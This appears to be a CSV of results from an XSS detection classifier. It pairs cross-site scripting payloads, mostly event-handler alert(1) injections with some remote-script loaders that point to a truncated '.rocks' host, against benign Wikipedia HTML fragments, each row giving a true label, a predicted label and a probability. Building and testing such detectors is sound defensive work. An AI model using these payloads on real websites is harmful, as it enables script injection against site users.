Unnamed: 0,payload,label,predicted_label,probability
4756,"<li class=""toclevel-1 tocsection-72""><a href=""#References""><span class=""tocnumber"">13 ",0,0,0.00013693981
3651,"	 </span> <span class=""toctext"">Robot rights ",0,0,0.001308682
12211,<button onpointermove=alert(1)>XSS</button>,1,1,0.99830645
10558,"<col onmousemove=""alert(1)"">test</col>",1,1,0.9966866
11950, ,0,0,0.0009942207
8844,"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",1,1,0.99566936
725,"<b onmouseup=""alert(1)"">test</b>",1,1,0.9973871
9514,<button id=x tabindex=1 onactivate=alert(1)></button>,1,1,0.9979418
4278,"	 </span> <span class=""toctext"">The limits of artificial general intelligence ",0,0,3.9248756e-05
9947,"<body onkeypress=""alert(1)"" contenteditable>test</body>",1,1,0.99822694
12694, </div>,0,0,0.00023409097
4173,<ol onpointerout=alert(1)>XSS</ol>,1,1,0.9966703
8384,"<button onpaste=""alert(1)"" contenteditable>test</button>",1,1,0.9982788
3263,"<li id=""cite_note-320""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-320"">^ </a> </b> ",0,0,0.00017452736
3633,"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",1,1,0.9947473
4283,"<li><a href=""/wiki/Received_view_of_theories"" title=""Received view of theories"">Received view </a>&#160;/&#32;<a href=""/wiki/Semantic_view_of_theories"" title=""Semantic view of theories"">Semantic view of theories </a> </li>",0,0,0.00018029496
6250,"<li id=""cite_note-309""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-309"">^ </a> </b> ",0,0,0.00015599412
5553,"  <link rel=""stylesheet"" href=""_static/css/tooltipster-sideTip-shadow.min.css"" type=""text/css"" />",0,0,4.3425174e-05
4361,"<applet onpaste=""alert(1)"" contenteditable>test</applet>",1,1,0.9968501
7470,"<li><a href=""/wiki/Software_framework"" title=""Software framework"">Software framework </a> </li>",0,0,0.00019339914
560,<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1,1,0.99507576
12946,"<li><a href=""/wiki/AI_box"" title=""AI box"">AI box </a> </li>",0,0,0.00015881119
1131,"	 <div id=""Glossaries_of_science_and_engineering"" style=""font-size:114%;margin:0 4em"">Glossaries of science and engineering </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0,0,2.8189928e-05
223,"<center draggable=""true"" ondrag=""alert(1)"">test</center>",1,1,0.9978097
4251,"	 </span> </a> </div><ul style=""border-top:1px solid #aaa; padding: 0.75em 0; width:217px; margin:0 auto;""><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/en/thumb/0/06/Wiktionary-logo-v2.svg/27px-Wiktionary-logo-v2.svg.png"" decoding=""async"" width=""27"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/0/06/Wiktionary-logo-v2.svg/41px-Wiktionary-logo-v2.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/0/06/Wiktionary-logo-v2.svg/54px-Wiktionary-logo-v2.svg.png 2x"" data-file-width=""391"" data-file-height=""391"" /> ",0,0,3.602114e-06
11357,"<li><a href=""/wiki/Testability"" title=""Testability"">Testability </a> </li>",0,0,0.00011042623
11233,"<h3><span class=""mw-headline"" id=""Probabilistic_methods_for_uncertain_reasoning"">Probabilistic methods for uncertain reasoning ",0,0,0.0004985435
354,	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,0,0,2.0890315e-05
12989,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
7938,"<table oncontextmenu=""alert(1)"">test</table>",1,1,0.9976955
11602,	 </span>,0,0,6.0303642e-05
11945,"<li class=""toclevel-2 tocsection-8""><a href=""#Learning""><span class=""tocnumber"">4.4 ",0,0,0.00012486345
4822,<samp onpointermove=alert(1)>XSS</samp>,1,1,0.9979504
6639,<mark onpointerleave=alert(1)>XSS</mark>,1,1,0.99805
2866,"<main onbeforecut=""alert(1)"" contenteditable>test</main>",1,1,0.996982
6416,"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",1,1,0.99656856
195, </div>,0,0,0.00023409097
10334,<body onload=alert(1)>,1,1,0.99811983
5398,	 </span> </li>,0,0,4.039223e-05
5147,"<image onmousedown=""alert(1)"">test</image>",1,1,0.9971534
12372,	 </span>,0,0,6.0303642e-05
8051,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Iphofen, Ron; Kritikos, Mihalis (3 January 2019). ""Regulating artificial intelligence and robotics: ethics by design in a digital society"". <i>Contemporary Social Science </i>: 1–15. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F21582041.2018.1563803"">10.1080/21582041.2018.1563803 </a>. <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/2158-2041"">2158-2041 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Contemporary+Social+Science&amp;rft.atitle=Regulating+artificial+intelligence+and+robotics%3A+ethics+by+design+in+a+digital+society&amp;rft.pages=1-15&amp;rft.date=2019-01-03&amp;rft_id=info%3Adoi%2F10.1080%2F21582041.2018.1563803&amp;rft.issn=2158-2041&amp;rft.aulast=Iphofen&amp;rft.aufirst=Ron&amp;rft.au=Kritikos%2C+Mihalis&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.3371187e-05
2239,	 </span>(1910) </li>,0,0,0.054099858
2417,"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",1,1,0.99784094
10405,<svg><noembed onload=alert(1)></noembed>,1,1,0.9978494
1952,"<rp onmouseenter=""alert(1)"">test</rp>",1,1,0.99785745
10639,"<element onmouseout=""alert(1)"">test</element>",1,1,0.9971471
10317,"<samp onpaste=""alert(1)"" contenteditable>test</samp>",1,1,0.9978652
10378,</script>,0,0,0.021858383
1456,"<div class=""section"" id=""all-the-rest"">",0,0,0.0021760196
7092," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human–computer interaction"">Human–computer<br />interaction </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,5.4077875e-05
9784,"<ul><li><a href=""/wiki/Symbolic_artificial_intelligence"" title=""Symbolic artificial intelligence"">Symbolic </a> </li>",0,0,0.00019460243
1333,"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",1,1,0.99771434
10234,"	 </span>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/16622160"">16622160 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+the+American+Medical+Informatics+Association&amp;rft.atitle=Using+Commercial+Knowledge+Bases+for+Clinical+Decision+Support%3A+Opportunities%2C+Hurdles%2C+and+Recommendations&amp;rft.volume=13&amp;rft.issue=4&amp;rft.pages=369-371&amp;rft.date=2006-07-01&amp;rft_id=%2F%2Fwww.ncbi.nlm.nih.gov%2Fpmc%2Farticles%2FPMC1513681&amp;rft_id=info%3Apmid%2F16622160&amp;rft_id=info%3Adoi%2F10.1197%2Fjamia.M2055&amp;rft.aulast=Kuperman&amp;rft.aufirst=G.+J.&amp;rft.au=Reichley%2C+R.+M.&amp;rft.au=Bailey%2C+T.+C.&amp;rft_id=%2F%2Fwww.ncbi.nlm.nih.gov%2Fpmc%2Farticles%2FPMC1513681&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,0.008266089
11020,"<object onmouseover=""alert(1)"">test</object>",1,1,0.9984089
3877,"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",1,1,0.99798673
10335,"<dl class=""docutils"">",0,0,0.00080150325
3895,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
13389,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Discover+Magazine&amp;rft.atitle=Cultivating+Common+Sense+%7C+DiscoverMagazine.com&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fdiscovermagazine.com%2F2017%2Fapril-2017%2Fcultivating-common-sense&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.1723425e-05
4595,	 </span>,0,0,6.0303642e-05
3238,<embed onpointermove=alert(1)>XSS</embed>,1,1,0.9980243
12384,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/leaders/21740735-humans-have-had-good-run-most-recent-breakthrough-robotics-it-clear"">""IKEA furniture and the limits of AI"" </a>. <i>The Economist </i>. 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">24 April ",0,0,2.0533584e-05
4105,"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",1,1,0.99473214
13160,"<li id=""cite_note-263""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-263"">^ </a> </b> ",0,0,0.00016118916
12381,"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",1,1,0.9974722
12795,<dl onpointerdown=alert(1)>XSS</dl>,1,1,0.99415594
5045,"<blink onmousedown=""alert(1)"">test</blink>",1,1,0.9931157
5674,"<li><a href=""/wiki/Software_quality"" title=""Software quality"">Software quality </a> </li> </ul>",0,0,0.00014452655
9060,<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,1,1,0.9945677
5627,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
8691,"<li><a href=""/wiki/Philosophy_of_social_science"" title=""Philosophy of social science"">Social science </a> </li>",0,0,0.00018269452
13143, </li>,0,0,0.00012413738
7561,"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",1,1,0.9980375
6332,"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",1,1,0.99750775
7284,"<li id=""cite_note-302""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-302"">^ </a> </b> ",0,0,0.00017457463
13341,<input4 onpointermove=alert(1)>XSS</input4>,1,1,0.9958039
2360,"<li id=""cite_note-402""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-402"">^ </a> </b> ",0,0,0.00018028019
757,"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",1,1,0.99786806
12227,"<tt ondblclick=""alert(1)"">test</tt>",1,1,0.9952524
12582,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
13301,"Dreyfus criticized the <a href=""/wiki/Necessary_and_sufficient"" class=""mw-redirect"" title=""Necessary and sufficient"">necessary </a> condition of the <a href=""/wiki/Physical_symbol_system"" title=""Physical symbol system"">physical symbol system </a> hypothesis, which he called the ""psychological assumption"": ""The mind can be viewed as a device operating on bits of information according to formal rules."" (<a href=""#CITEREFDreyfus1992"">Dreyfus 1992 </a>, p.&#160;156) ",0,0,0.072617754
1616,"	 </span> <span class=""toctext"">Economics ",0,0,4.0218463e-05
4310,"<li><a href=""/wiki/Philosophy_of_biology"" title=""Philosophy of biology"">Biology </a> </li>",0,0,0.0001836159
12981,"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",1,1,0.9956359
7265,"<track onmouseover=""alert(1)"">test</track>",1,1,0.99815476
12188,	 </span> </a> </li>,0,0,3.6811532e-05
16,<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1,1,0.9966963
6253,"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1,1,0.99722195
333,"<section onmouseover=""alert(1)"">test</section>",1,1,0.9977308
12453,"<time oncontextmenu=""alert(1)"">test</time>",1,1,0.99763656
4463,"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;227–331 </li>",0,0,0.00013465427
9704,"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",1,1,0.99565405
10598,"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",1,1,0.99821466
348,"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0,0,0.0001129037
1158,"<li id=""cite_note-AI_at_Stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Stanford_in_the_60s_161-0"">^ </a> </b> ",0,0,0.000107763815
9815,"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",1,1,0.9966713
12695,"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",1,1,0.9979112
7975,"<li id=""cite_note-366""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-366"">^ </a> </b> ",0,0,0.00011437262
4416,"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",1,1,0.9979113
5736,"<col oncut=""alert(1)"" contenteditable>test</col>",1,1,0.99511933
3256,"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",1,1,0.9962155
1791,"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;51–107 </li>",0,0,0.0038856466
4630,<figure id=x tabindex=1 onactivate=alert(1)></figure>,1,1,0.98017097
8148,	 </span>,0,0,6.0303642e-05
3643, ,0,0,0.0009942207
11444, </li>,0,0,0.00012413738
7298,"<li><a href=""/wiki/Evolutionary_multimodal_optimization"" title=""Evolutionary multimodal optimization"">Evolutionary multimodal optimization </a> </li>",0,0,0.00010702626
13070,"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>",1,1,0.9914382
7947,"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",1,1,0.99466324
1859,<svg><bdi onload=alert(1)></bdi>,1,1,0.99630374
10790,"<li><a href=""/wiki/Machine_vision"" title=""Machine vision"">Machine vision </a> </li>",0,0,0.00017975392
11608,"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1,1,0.99782974
6339,"<picture onmouseup=""alert(1)"">test</picture>",1,1,0.99668694
1512,"<details draggable=""true"" ondragend=""alert(1)"">test</details>",1,1,0.99664676
12876,"<STYLE TYPE=""text/javascript"">alert('');</STYLE>",1,1,0.99745756
11815,"<li><a href=""/wiki/Control_theory"" title=""Control theory"">Control method </a> </li>",0,0,0.000109001536
355,<applet onreadystatechange=alert(1)></applet>,1,1,0.99721545
7416, </li>,0,0,0.00012413738
4177,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=30"" title=""Edit section: Classifiers and statistical learning methods"">edit </a><span class=""mw-editsection-bracket"">] ",0,0,2.601693e-05
9809,"<output oncut=""alert(1)"" contenteditable>test</output>",1,1,0.99810225
8021,"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",1,1,0.99750096
13350,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=How+to+build+complete+creatures+rather+than+isolated+cognitive+simulators&amp;rft.btitle=Architectures+for+Intelligence&amp;rft.place=Hillsdale%2C+NJ&amp;rft.pages=225-239&amp;rft.pub=Lawrence+Erlbaum+Associates&amp;rft.date=1991&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.52.9510&amp;rft.aulast=Brooks&amp;rft.aufirst=R.+A.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.0913099e-06
8950,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
2835,"<element onmouseenter=""alert(1)"">test</element>",1,1,0.9971497
1439,"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",1,1,0.99754304
9160,"<li id=""cite_note-134""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-134"">^ </a> </b> ",0,0,0.00011601689
12185,"<li id=""cite_note-AI_as_evolution-412""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_as_evolution_412-0"">^ </a> </b> ",0,0,0.00010752793
10388,"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",1,1,0.9973532
5873,"<command onkeyup=""alert(1)"" contenteditable>test</command>",1,1,0.99822277
12803,Discussion:,0,0,0.02540122
11549,"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1,1,0.9929726
4424,"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1,1,0.99748826
5811,"<source onmouseup=""alert(1)"">test</source>",1,1,0.99804735
4880,"<li><a href=""/wiki/Enterprise_information_system"" title=""Enterprise information system"">Enterprise information system </a> </li>",0,0,0.000109279186
8398,<shadow onpointermove=alert(1)>XSS</shadow>,1,1,0.99444157
9077,"<li><a href=""/wiki/Three-dimensional_integrated_circuit"" title=""Three-dimensional integrated circuit"">Three-dimensional integrated circuit </a> </li> </ul>",0,0,0.00011707286
1814,"	 </span> <span class=""reference-text""><cite class=""citation book"">Pennachin, C.; Goertzel, B. (2007). <i>Contemporary Approaches to Artificial General Intelligence </i>. <i>Artificial General Intelligence. Cognitive Technologies </i>. Cognitive Technologies. Berlin, Heidelberg: Springer. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-540-68677-4_1"">10.1007/978-3-540-68677-4_1 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-540-23733-4"" title=""Special:BookSources/978-3-540-23733-4""><bdi>978-3-540-23733-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Contemporary+Approaches+to+Artificial+General+Intelligence&amp;rft.place=Berlin%2C+Heidelberg&amp;rft.series=Cognitive+Technologies&amp;rft.pub=Springer&amp;rft.date=2007&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-540-68677-4_1&amp;rft.isbn=978-3-540-23733-4&amp;rft.aulast=Pennachin&amp;rft.aufirst=C.&amp;rft.au=Goertzel%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,0.00035386448
851,<svg onpointerenter=alert(1)>XSS</svg>,1,1,0.9978846
5995,	 </ul>,0,0,3.8504728e-05
6703,<hgroup onpointerenter=alert(1)>XSS</hgroup>,1,1,0.9967573
227,"<keygen onclick=""alert(1)"">test</keygen>",1,1,0.9959987
10272,"<section onmouseup=""alert(1)"">test</section>",1,1,0.9975715
12940,"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></aside>",1,1,0.9978607
13364,"<body draggable=""true"" ondrag=""alert(1)"">test</body>",1,1,0.99822104
834,"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/business/21732125-tech-giants-are-investing-billions-transformative-technology-google-leads-race"">""Google leads in the race to dominate artificial intelligence"" </a>. <i>The Economist </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0,0,2.0533564e-05
7799,"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",1,1,0.9975209
7426,<image2 onpointerdown=alert(1)>XSS</image2>,1,1,0.996159
11059,"<element draggable=""true"" ondrag=""alert(1)"">test</element>",1,1,0.99684525
6086,"<figure oncut=""alert(1)"" contenteditable>test</figure>",1,1,0.9900172
11234,<title>Artificial intelligence - Wikipedia </title>,0,0,0.010620608
12074,<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,1,1,0.9980871
12279,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
4683,<iframe id=x onfocusin=alert(1)>,1,1,0.9788888
10068,"<menu onmouseover=""alert(1)"">test</menu>",1,1,0.9979326
2909,</div>,0,0,0.001989937
2366,"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",1,1,0.99084973
11268,"<section ondblclick=""alert(1)"">test</section>",1,1,0.99482536
8976,"<map onkeydown=""alert(1)"" contenteditable>test</map>",1,1,0.99747974
6204,"<p>It is possible to use AI to predict or generalize the behavior of customers from their <a href=""/wiki/Digital_footprints"" class=""mw-redirect"" title=""Digital footprints"">digital footprints </a> in order to target them with personalized promotions or build customer personas automatically.<sup id=""cite_ref-Matz_et_al_2017_340-0"" class=""reference""><a href=""#cite_note-Matz_et_al_2017-340"">&#91;329&#93; </a> </sup> A documented case reports that online gambling companies were using AI to improve customer targeting.<sup id=""cite_ref-341"" class=""reference""><a href=""#cite_note-341"">&#91;330&#93; </a> </sup>",0,0,3.5404864e-06
1017,"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",1,1,0.9877418
13226,"<img onkeypress=""alert(1)"" contenteditable>test</img>",1,1,0.99652106
2956, ,0,0,0.0009942207
7262,"<ul><li><a href=""/wiki/Behaviorism"" title=""Behaviorism"">Behaviorism </a> (<a href=""/wiki/Radical_behaviorism"" title=""Radical behaviorism"">Radical </a>) </li>",0,0,0.00015161118
11700,<tr onpointermove=alert(1)>XSS</tr>,1,1,0.99802727
6006,<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,1,1,0.99727577
4101,"<STYLE type=""text/css"">BODY{background:url(""<javascript:alert>('')"")}</STYLE>",1,1,0.99740046
4598,"<dt onkeydown=""alert(1)"" contenteditable>test</dt>",1,1,0.9972257
138,<del id=x tabindex=1 onactivate=alert(1)></del>,1,1,0.9847059
5362,"<output onkeypress=""alert(1)"" contenteditable>test</output>",1,1,0.9981474
1114,"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",1,1,0.99566776
147,	 <div>,0,0,5.0404815e-05
10860,"<noembed onbeforecopy=""alert(1)"" contenteditable>test</noembed>",1,1,0.9982135
6358,"<slot ondblclick=""alert(1)"">test</slot>",1,1,0.9918897
6203,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;375–430, </li>",0,0,0.00015822308
4673,"<dd onpaste=""alert(1)"" contenteditable>test</dd>",1,1,0.99707454
10562,"<li onkeyup=""alert(1)"" contenteditable>test</li>",1,1,0.97633225
12754,<keygen onpointerenter=alert(1)>XSS</keygen>,1,1,0.997897
7726,<rtc onpointerdown=alert(1)>XSS</rtc>,1,1,0.9978687
6214,          </dd>,0,0,4.8190937e-05
6631,"<legend ondblclick=""alert(1)"">test</legend>",1,1,0.9815166
13581,"<footer draggable=""true"" ondragend=""alert(1)"">test</footer>",1,1,0.9977849
7115,"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",1,1,0.9956707
104,"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",1,1,0.99785507
595,"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",1,1,0.99713886
8061, </li>,0,0,0.00012413738
3927,"<li><a href=""/wiki/Multithreading_(computer_architecture)"" title=""Multithreading (computer architecture)"">Multithreading </a> </li>",0,0,0.00011048204
10141,"<li id=""cite_note-Second_AI_winter-12""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Second_AI_winter_12-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Second_AI_winter_12-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,0.00010879903
7497,"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",1,1,0.99776584
7573,"<dt><a class=""reference internal"" href=""topics/telnetconsole.html""><span class=""doc"">Telnet Console",0,0,0.0071329013
10813,"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",1,1,0.9979871
11287,"<pre ondblclick=""alert(1)"">test</pre>",1,1,0.992765
11356,<wbr onpointerleave=alert(1)>XSS</wbr>,1,1,0.99574506
8687,"<ol onmouseleave=""alert(1)"">test</ol>",1,1,0.996259
4577, </li>,0,0,0.00012413738
9828,"	 </span> <span class=""reference-text""><a href=""#CITEREFCNN2006""><i>CNN </i> 2006 </a>. ",0,0,2.0523717e-05
8992,"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;214–215 </li>",0,0,0.00015811597
8486,"<area onclick=""alert(1)"">test</area>",1,1,0.99643993
9805,"<span onpaste=""alert(1)"" contenteditable>test</span>",1,1,0.9976168
286,<header id=x tabindex=1 onfocus=alert(1)></header>,1,1,0.9924995
9253,<hgroup onpointerleave=alert(1)>XSS</hgroup>,1,1,0.99646676
7731,"<li><a href=""/wiki/Holographic_data_storage"" title=""Holographic data storage"">Holographic data storage </a> </li> </ul> </li>",0,0,0.00012504659
7758,"<li><a href=""/wiki/Unmanned_ground_vehicle"" title=""Unmanned ground vehicle"">ground </a> </li> </ul> </li>",0,0,0.00011590288
5253,"<fieldset onkeypress=""alert(1)"" contenteditable>test</fieldset>",1,1,0.9728938
1525,"<sup onmouseleave=""alert(1)"">test</sup>",1,1,0.9968169
3562,<select onpointerup=alert(1)>XSS</select>,1,1,0.99617004
1786,<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,1,1,0.99208385
1957,<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,1,1,0.9956333
10497,	 </span>,0,0,6.0303642e-05
12451,	 </span> </a> </li>,0,0,3.6811532e-05
6642,<tfoot onpointerleave=alert(1)>XSS</tfoot>,1,1,0.9978914
62,<article onpointerleave=alert(1)>XSS</article>,1,1,0.9970375
7845,"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a> </li> </ul>",0,0,0.0001356339
613,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""httx://.rocks/.js""></SCRIPT>",1,0,0.0007531078
8759,"<button ondblclick=""alert(1)"">test</button>",1,1,0.9976141
5835,"<spacer onmouseenter=""alert(1)"">test</spacer>",1,1,0.9978963
4749,"<hr onmousedown=""alert(1)"">test</hr>",1,1,0.99500257
6352,"<html onmouseover=""alert(1)"">test</html>",1,1,0.99525696
1323,	 </span>(1945) </li>,0,0,5.2369298e-05
10967,"<legend oncut=""alert(1)"" contenteditable>test</legend>",1,1,0.99526346
8064,"<base onmouseout=""alert(1)"">test</base>",1,1,0.99802715
4564,<select onpointerdown=alert(1)>XSS</select>,1,1,0.9960625
